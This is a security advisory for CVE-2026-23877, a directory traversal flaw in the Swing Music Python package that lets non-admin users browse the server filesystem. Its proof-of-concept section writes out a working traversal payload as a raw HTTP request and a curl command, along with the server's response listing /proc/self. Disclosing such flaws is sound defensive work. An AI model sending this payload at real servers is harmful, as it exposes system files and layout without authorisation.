# [M] Swing Music has a Directory Traversal & Filesystem can be accessed by a non-admin user

## Summary
Severity: Medium
Advisory: GHSA-pj88-9xww-gxmh
CVE: CVE-2026-23877
CWE: CWE-25
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-pj88-9xww-gxmh
Type: github-advisory

## Affected
- PyPI: `swingmusic` — affected >=0 <2.1.4

## Details
### Summary
Swing Music's `list_folders()` function in the `/folder/dir-browser` endpoint is vulnerable to directory traversal attacks. Any authenticated user (including non-admin) can browse arbitrary directories on the server filesystem.

### Details
The `@api.post("/dir-browser")` endpoint lacks proper path validation and authorization checks:
- **No authorization requirement**: Any authenticated user can access the endpoint
- **Improper path handling**: The code attempts to prepend "/" to non-existent paths but this doesn't prevent traversal:
```python
req_dir = pathlib.Path("../../../../etc")  # → PosixPath('../../../../etc')
if not req_dir.exists():                    # → False
    req_dir = "/" / req_dir                 # → PosixPath('/../../../../etc')
```

### PoC
1. Create a non-admin user
2. Authenticate as a non-admin user
3. Send the following request:
```
POST /folder/dir-browser HTTP/1.1
Host: IP:1970
Content-Type: application/json
Cookie: access_token_cookie=non-admin-access-token
Connection: keep-alive

{"folder":"/music/../proc/self/", "tracks_only":false}
```
```bash
curl --path-as-is -i -s -k -X $'POST' -H $'Content-Type: application/json' -b $'access_token_cookie=non-admin-access-token' \
    --data-binary $'{\"folder\":\"/music/../proc/self/\", \"tracks_only\":false}' \
    $'http://IP:1970/folder/dir-browser'
```
4. The response will list directories from `/proc/self` instead of restricting to user-accessible paths:
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 466
Vary: Accept-Encoding
Connection: Keep-Alive

{"folders":[{"name":"attr","path":"/music/../proc/self/attr"},{"name":"cwd","path":"/music/../proc/self/cwd"},{"name":"fd","path":"/music/../proc/self/fd"},{"name":"fdinfo","path":"/music/../proc/self/fdinfo"},{"name":"map_files","path":"/music/../proc/self/map_files"},{"name":"net","path":"/music/../proc/self/net"},{"name":"ns","path":"/music/../proc/self/ns"},{"name":"root","path":"/music/../proc/self/root"},{"name":"task","path":"/music/../proc/self/task"}]}
```

### Impact

**Information Disclosure:**
- Server filesystem structure and layout
- Configuration file locations and names
- User account names from directory listings
- Software versions and installed packages
- Log file locations and system paths

**Additional Risks:**
- Preparation for further attacks (LFI, RCE)
- Bypass of access control mechanisms
- Exposure of sensitive directory structures

## References
- https://github.com/swingmx/swingmusic/security/advisories/GHSA-pj88-9xww-gxmh
- https://nvd.nist.gov/vuln/detail/CVE-2026-23877
- https://github.com/swingmx/swingmusic/commit/9a915ca62af1502b9550722df82f5d432cb73de3
- https://github.com/swingmx/swingmusic
